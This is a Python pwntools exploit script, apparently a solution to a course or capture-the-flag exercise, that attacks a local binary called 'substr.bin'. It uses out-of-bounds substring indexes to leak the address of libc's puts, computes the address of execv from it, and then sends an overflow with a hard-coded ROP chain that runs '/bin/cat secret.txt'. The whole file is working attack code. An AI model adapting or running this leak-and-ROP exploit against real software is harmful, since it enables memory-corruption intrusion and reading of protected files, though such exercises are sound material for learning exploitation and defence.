#!/usr/bin/python3

from pwn import *

def exploit():
    # Write your exploit logic here.
    p = process("./substr.bin")

    #Caution: Note that the gadget for %rsi contains two "pop" instructions.
    #rop = ROP("./substr.bin")
    #print(rop.rdi)
    #print(rop.rsi)

    #You can investigate the offset of libc functions as follow.
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    puts_offset = libc.symbols['puts']
    execv_offset = libc.symbols['execv']
    
    for i in range(1):
        print(p.recvline())
    print(p.recvuntil(b"[*] Input a string that you want to slice: "))
    p.sendline(b"aaaaa")

    print(p.recvuntil(b"[*] Input the start and end indexes to extract with: "))
    p.sendline(b"-200 -192")

    print(p.recvuntil(b"[*] Here is your extracted substring: "))
    puts_address=p.recv(8)
    print(puts_address)
    puts_u64_address=u64(puts_address)
    result = puts_u64_address-puts_offset+execv_offset

    for i in range(1):
       print(p.recvline())
    print(p.recvuntil(b"[*] Input a string that you want to slice: "))
    p.sendline(b"/bin/cat\0" + b"\x00"*0x7 + b"secret.txt\0" + b"\x00"*0x5 + p64(0x4040e0)+p64(0x4040f0)+p64(0x0))
    print(p.recvuntil(b"[*] Input the start and end indexes to extract with: "))
    p.sendline(b"a"*0x48 + p64(0x401333) + p64(0x4040e0) + p64(0x401331)+ p64(0x404100) + p64(0x4142) + p64(result))
    print(p.recvline())


    

if __name__ == "__main__":
    exploit()
